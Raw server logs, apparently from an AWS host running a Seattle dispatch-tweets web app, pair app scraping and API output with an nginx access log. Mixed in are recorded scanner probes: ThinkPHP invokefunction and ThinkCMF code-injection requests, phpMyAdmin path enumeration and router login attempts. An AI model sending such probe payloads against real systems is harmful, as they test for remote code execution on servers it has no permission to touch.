Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > 8/21/2020 -> 245 (1468ms)
Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > 8/22/2020
Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > 8/22/2020 rows:  170
Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > 8/22/2020 -> 170 (740ms)
Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > 8/23/2020
Aug 23 00:12:20 ip-172-31-39-103 web: [1] >> scrapeDate > Warning: Cannot read property 'children' of null
Aug 23 00:12:20 ip-172-31-39-103 web: [1] update > 2283ms
Aug 23 00:12:21 ip-172-31-39-103 web: [1] combine > 415 --> 367 (62ms)
Aug 23 00:12:21 ip-172-31-39-103 web: [1] database > downloaded 365 entries in 0.205 sec
Aug 23 00:12:21 ip-172-31-39-103 web: [1] >> resolveLocally > resolved 365 out of 367
Aug 23 00:12:21 ip-172-31-39-103 web: [1] resolve > requesting 2 out of 2
Aug 23 00:12:21 ip-172-31-39-103 web: [1] resolve > IDs: F200083580,F200083581
Aug 23 00:12:21 ip-172-31-39-103 web: [1] resolve > 2 ids (URI length: 191)
Aug 23 00:12:21 ip-172-31-39-103 web: [1] data.seattle.gov call failed: 503 Error: Request failed with status code 503
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at createError (/var/app/current/node_modules/axios/lib/core/createError.js:16:15)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at settle (/var/app/current/node_modules/axios/lib/core/settle.js:17:12)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at IncomingMessage.handleStreamEnd (/var/app/current/node_modules/axios/lib/adapters/http.js:236:11)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at IncomingMessage.emit (events.js:327:22)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at IncomingMessage.EventEmitter.emit (domain.js:483:12)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at endReadableNT (_stream_readable.js:1220:12)
Aug 23 00:12:21 ip-172-31-39-103 web: [1]     at processTicksAndRejections (internal/process/task_queues.js:84:21)
Aug 23 00:12:21 ip-172-31-39-103 web: [1] resolve >>> stopped due to error: Request failed with status code 503
Aug 23 00:12:21 ip-172-31-39-103 web: [1] main >>> stopped due to error: nhoods > No source file provided
Aug 23 00:12:21 ip-172-31-39-103 web: [1] npm run backgroundTasks exited with code 0
Aug 23 01:39:28 ip-172-31-39-103 web: [0] #033[0mGET /portal/redlion #033[32m200#033[0m 0.681 ms - 706#033[0m
Aug 23 02:15:02 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.550 ms - 706#033[0m
Aug 23 02:15:02 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.512 ms - 706#033[0m
Aug 23 03:10:31 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.498 ms - 706#033[0m
Aug 23 03:45:09 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.514 ms - 706#033[0m
Aug 23 03:56:07 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.477 ms - 706#033[0m
Aug 23 04:43:25 ip-172-31-39-103 web: [0] #033[0mPOST /boaform/admin/formLogin #033[33m404#033[0m 0.268 ms - 163#033[0m
Aug 23 05:16:48 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.568 ms - 706#033[0m
Aug 23 05:54:26 ip-172-31-39-103 web: [0] #033[0mGET /config/getuser?index=0 #033[32m200#033[0m 0.657 ms - 706#033[0m
Aug 23 06:46:06 ip-172-31-39-103 web: [0] #033[0mGET /config/getuser?index=0 #033[32m200#033[0m 0.734 ms - 706#033[0m
Aug 23 07:20:37 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.472 ms - 706#033[0m
Aug 23 09:15:09 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.499 ms - 706#033[0m
Aug 23 10:54:48 ip-172-31-39-103 web: [0] #033[0mGET /solr/admin/info/system?wt=json #033[32m200#033[0m 0.667 ms - 706#033[0m
Aug 23 11:16:37 ip-172-31-39-103 web: [0] #033[0mGET /?XDEBUG_SESSION_START=phpstorm #033[32m200#033[0m 0.495 ms - 706#033[0m
Aug 23 11:41:17 ip-172-31-39-103 web: [0] #033[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> #033[32m200#033[0m 0.488 ms - 706#033[0m
Aug 23 11:50:05 ip-172-31-39-103 web: [0] #033[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP #033[32m200#033[0m 0.665 ms - 706#033[0m
Aug 23 12:09:55 ip-172-31-39-103 web: [0] #033[0mGET /database/print.css #033[32m200#033[0m 0.668 ms - 706#033[0m
Aug 23 12:09:56 ip-172-31-39-103 web: [0] #033[0mGET /pma/print.css #033[32m200#033[0m 0.683 ms - 706#033[0m
Aug 23 12:09:56 ip-172-31-39-103 web: [0] #033[0mGET /phpmyadmin/print.css #033[32m200#033[0m 0.705 ms - 706#033[0m
Aug 23 12:09:56 ip-172-31-39-103 web: [0] #033[0mGET /myadmin/print.css #033[32m200#033[0m 0.727 ms - 706#033[0m
Aug 23 12:09:56 ip-172-31-39-103 web: [0] #033[0mGET /phpMyAdmin/print.css #033[32m200#033[0m 0.659 ms - 706#033[0m
Aug 23 12:09:57 ip-172-31-39-103 web: [0] #033[0mGET /mysql/print.css #033[32m200#033[0m 0.660 ms - 706#033[0m
Aug 23 12:28:06 ip-172-31-39-103 web: [0] #033[0mGET /ap/forgotpassword #033[32m200#033[0m 0.707 ms - 706#033[0m
Aug 23 12:41:03 ip-172-31-39-103 web: [0] #033[0mGET /hudson #033[32m200#033[0m 0.657 ms - 706#033[0m
Aug 23 12:52:38 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.534 ms - 706#033[0m
Aug 23 13:57:29 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.484 ms - 706#033[0m
Aug 23 14:56:51 ip-172-31-39-103 web: [0] #033[0mGET /wp-login.php #033[32m200#033[0m 0.664 ms - 706#033[0m
Aug 23 15:15:26 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.519 ms - 706#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /index.html #033[36m304#033[0m 0.342 ms - -#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /static/js/runtime-main.98a2b520.js #033[36m304#033[0m 0.768 ms - -#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /static/js/main.e929d0ea.chunk.js #033[36m304#033[0m 0.636 ms - -#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /static/js/2.1a3d3324.chunk.js #033[36m304#033[0m 1.213 ms - -#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /static/css/main.bcb4ba68.chunk.css #033[36m304#033[0m 0.568 ms - -#033[0m
Aug 23 15:39:17 ip-172-31-39-103 web: [0] #033[0mGET /static/css/2.daf24185.chunk.css #033[36m304#033[0m 1.048 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|seattle params=area:seattle query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/seattle #033[32m200#033[0m 5.064 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|active24 params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|seattle params=area:seattle query=activeOrMajor:true
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|status params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/status #033[32m200#033[0m 7.232 ms - 82#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|seattle params=area:seattle query=hiRes:true,minimize:true
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|major params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|history|annotations params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/history/annotations #033[36m304#033[0m 10.080 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/active24 #033[32m200#033[0m 6.020 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/seattle?activeOrMajor=true #033[32m200#033[0m 6.648 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/seattle?minimize=true&hiRes=true #033[32m200#033[0m 8.695 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/major #033[32m200#033[0m 9.464 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|byArea params= query=activeOrMajor:true
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/byArea?activeOrMajor=true #033[32m200#033[0m 4.677 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|punchcard params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/punchcard #033[32m200#033[0m 2.572 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|byArea params= query=
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/byArea #033[32m200#033[0m 4.920 ms - -#033[0m
Aug 23 15:39:18 ip-172-31-39-103 web: [0] >> Cache HIT: path=|tweets|seattle params=area:seattle query=compare:6,minimize:true
Aug 23 15:39:18 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/tweets/seattle?minimize=true&compare=6 #033[32m200#033[0m 2.006 ms - -#033[0m
Aug 23 15:39:19 ip-172-31-39-103 web: [0] Tile: /var/app/current/datasets/tiles/dark/10/10-164-356-@2x.png
Aug 23 15:39:19 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/maps/164/356/10/dark?phone=true #033[32m200#033[0m 1.400 ms - -#033[0m
Aug 23 15:39:19 ip-172-31-39-103 web: [0] Tile: /var/app/current/datasets/tiles/dark/10/10-164-358-@2x.png
Aug 23 15:39:19 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/maps/164/358/10/dark?phone=true #033[32m200#033[0m 1.028 ms - -#033[0m
Aug 23 15:45:07 ip-172-31-39-103 web: [0] >> Cache HIT: path=|status params= query=
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/status #033[32m200#033[0m 1.611 ms - 82#033[0m
Aug 23 15:45:07 ip-172-31-39-103 web: [0] >> Cache HIT: path=|history params= query=
Aug 23 15:45:07 ip-172-31-39-103 web: [0] dispatchRouter > memory usage: pid: 3899, title: node
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #011rss 101.46 MB
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #011heapTotal 72.48 MB
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #011heapUsed 67.91 MB
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #011external 24.83 MB
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #011arrayBuffers 22.91 MB
Aug 23 15:45:07 ip-172-31-39-103 web: [0] #033[0mGET /api/dispatch/history #033[32m200#033[0m 2.758 ms - -#033[0m
Aug 23 16:16:24 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.483 ms - 706#033[0m
Aug 23 17:08:49 ip-172-31-39-103 web: [0] #033[0mGET /etc/ #033[32m200#033[0m 0.682 ms - 706#033[0m
Aug 23 17:19:42 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.489 ms - 706#033[0m
Aug 23 17:22:52 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.513 ms - 706#033[0m
Aug 23 19:02:35 ip-172-31-39-103 web: [0] #033[0mPOST /boaform/admin/formLogin #033[33m404#033[0m 0.272 ms - 163#033[0m
Aug 23 19:16:07 ip-172-31-39-103 web: [0] #033[0mGET / #033[32m200#033[0m 0.507 ms - 706#033[0m


----------------------------------------
/var/log/nginx/access.log
----------------------------------------
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /static/js/runtime-main.98a2b520.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:10 +0000] "GET /static/css/main.bcb4ba68.chunk.css HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /static/js/main.e929d0ea.chunk.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /static/js/2.1a3d3324.chunk.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:10 +0000] "GET /static/css/2.daf24185.chunk.css HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /favicon.ico HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/seattle HTTP/1.1" 200 15689 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/seattle?minimize=true&hiRes=true HTTP/1.1" 200 1949 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/active24 HTTP/1.1" 200 709 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/seattle?activeOrMajor=true HTTP/1.1" 200 791 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/byArea HTTP/1.1" 200 10285 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/byArea?activeOrMajor=true HTTP/1.1" 200 10285 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/status HTTP/1.1" 200 82 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/history/annotations HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/tweets/major HTTP/1.1" 200 563 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/punchcard HTTP/1.1" 200 1022 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:10 +0000] "GET /api/dispatch/history HTTP/1.1" 200 8361 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:10 +0000] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 200 706 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/329/715/11/dark HTTP/1.1" 200 41370 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/328/715/11/dark HTTP/1.1" 200 55005 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/327/714/11/dark HTTP/1.1" 200 16893 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/329/714/11/dark HTTP/1.1" 200 42531 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/328/716/11/dark HTTP/1.1" 200 56181 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/328/714/11/dark HTTP/1.1" 200 41995 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/327/716/11/dark HTTP/1.1" 200 21261 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/327/715/11/dark HTTP/1.1" 200 20710 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/tweets/seattle?minimize=true&compare=6 HTTP/1.1" 200 1635 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:11 +0000] "GET /apple-touch-icon-152x152.png HTTP/1.1" 200 706 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/329/716/11/dark HTTP/1.1" 200 30404 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/163/358/10/dark HTTP/1.1" 200 33299 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/164/357/10/dark HTTP/1.1" 200 60848 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [22/Aug/2020:22:58:11 +0000] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 200 706 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/163/357/10/dark HTTP/1.1" 200 45200 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/164/358/10/dark HTTP/1.1" 200 61576 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/164/356/10/dark HTTP/1.1" 200 47234 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [22/Aug/2020:22:58:11 +0000] "GET /api/dispatch/maps/163/356/10/dark HTTP/1.1" 200 27053 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [22/Aug/2020:22:58:11 +0000] "GET /apple-touch-icon.png HTTP/1.1" 200 706 "-" "Amazon CloudFront" "76.121.224.159"
64.252.82.20 - - [22/Aug/2020:23:04:17 +0000] "GET /index.html HTTP/1.1" 200 706 "-" "Amazon CloudFront" "147.135.191.81"
185.39.11.105 - - [22/Aug/2020:23:44:40 +0000] "GET /config/getuser?index=0 HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
80.82.78.85 - - [22/Aug/2020:23:56:09 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
102.165.30.13 - - [22/Aug/2020:23:59:53 +0000] "GET / HTTP/1.0" 200 706 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com" "-"
211.72.124.136 - - [23/Aug/2020:00:10:11 +0000] "GET / HTTP/1.0" 200 706 "-" "-" "-"
192.241.237.80 - - [23/Aug/2020:01:39:28 +0000] "GET /portal/redlion HTTP/1.1" 200 706 "-" "Mozilla/5.0 zgrab/0.x" "-"
162.142.125.25 - - [23/Aug/2020:02:15:02 +0000] "GET / HTTP/1.1" 200 706 "-" "-" "-"
162.142.125.25 - - [23/Aug/2020:02:15:02 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
209.17.96.242 - - [23/Aug/2020:03:10:31 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)" "-"
185.216.140.6 - - [23/Aug/2020:03:45:09 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 zgrab/0.x" "-"
71.6.232.2 - - [23/Aug/2020:03:56:07 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" "-"
59.126.158.52 - - [23/Aug/2020:04:11:21 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
185.150.189.165 - - [23/Aug/2020:04:43:25 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://52.36.238.40:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
185.150.189.165 - - [23/Aug/2020:04:43:25 +0000] "" 400 0 "-" "-" "-"
188.212.168.153 - - [23/Aug/2020:05:16:48 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
185.150.189.165 - - [23/Aug/2020:05:54:26 +0000] "GET /config/getuser?index=0 HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
185.150.189.165 - - [23/Aug/2020:06:46:06 +0000] "GET /config/getuser?index=0 HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" "-"
83.97.20.30 - - [23/Aug/2020:07:20:37 +0000] "GET / HTTP/1.0" 200 706 "-" "-" "-"
128.201.228.229 - - [23/Aug/2020:09:15:09 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
195.54.160.21 - - [23/Aug/2020:10:54:48 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
195.54.160.21 - - [23/Aug/2020:11:16:37 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
195.54.160.21 - - [23/Aug/2020:11:41:17 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
195.54.160.21 - - [23/Aug/2020:11:50:05 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
64.252.86.220 - - [23/Aug/2020:12:09:55 +0000] "GET /database/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
64.252.86.23 - - [23/Aug/2020:12:09:56 +0000] "GET /pma/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
64.252.86.23 - - [23/Aug/2020:12:09:56 +0000] "GET /phpmyadmin/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
64.252.86.220 - - [23/Aug/2020:12:09:56 +0000] "GET /myadmin/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
64.252.86.23 - - [23/Aug/2020:12:09:56 +0000] "GET /phpMyAdmin/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
64.252.86.23 - - [23/Aug/2020:12:09:57 +0000] "GET /mysql/print.css HTTP/1.1" 200 706 "-" "Amazon CloudFront" "185.234.218.239"
167.172.53.100 - - [23/Aug/2020:12:28:06 +0000] "GET /ap/forgotpassword HTTP/1.1" 200 706 "-" "Mozilla/5.0 zgrab/0.x" "-"
192.241.217.38 - - [23/Aug/2020:12:41:03 +0000] "GET /hudson HTTP/1.1" 200 706 "-" "Mozilla/5.0 zgrab/0.x" "-"
103.12.112.69 - - [23/Aug/2020:12:52:38 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
197.232.6.48 - - [23/Aug/2020:13:57:29 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
64.252.86.220 - - [23/Aug/2020:14:56:51 +0000] "GET /wp-login.php HTTP/1.1" 200 706 "-" "Amazon CloudFront" "149.202.45.11"
151.235.217.156 - - [23/Aug/2020:15:15:26 +0000] "GET / HTTP/1.1" 200 706 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
64.252.70.221 - - [23/Aug/2020:15:39:17 +0000] "GET /index.html HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [23/Aug/2020:15:39:17 +0000] "GET /static/js/runtime-main.98a2b520.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:17 +0000] "GET /static/js/main.e929d0ea.chunk.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:17 +0000] "GET /static/js/2.1a3d3324.chunk.js HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:17 +0000] "GET /static/css/main.bcb4ba68.chunk.css HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:17 +0000] "GET /static/css/2.daf24185.chunk.css HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/seattle HTTP/1.1" 200 17570 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/status HTTP/1.1" 200 82 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/history/annotations HTTP/1.1" 304 0 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/active24 HTTP/1.1" 200 897 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/seattle?activeOrMajor=true HTTP/1.1" 200 966 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/seattle?minimize=true&hiRes=true HTTP/1.1" 200 2098 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/major HTTP/1.1" 200 576 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.221 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/byArea?activeOrMajor=true HTTP/1.1" 200 11399 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/punchcard HTTP/1.1" 200 1022 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/byArea HTTP/1.1" 200 11399 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.144 - - [23/Aug/2020:15:39:18 +0000] "GET /api/dispatch/tweets/seattle?minimize=true&compare=6 HTTP/1.1" 200 1647 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:19 +0000] "GET /api/dispatch/maps/164/356/10/dark?phone=true HTTP/1.1" 200 47235 "-" "Amazon CloudFront" "76.121.224.159"
64.252.70.194 - - [23/Aug/2020:15:39:19 +0000] "GET /api/dispatch/maps/164/358/10/dark?phone=true HTTP/1.1" 200 61554 "-" "Amazon CloudFront" "76.121.224.159"
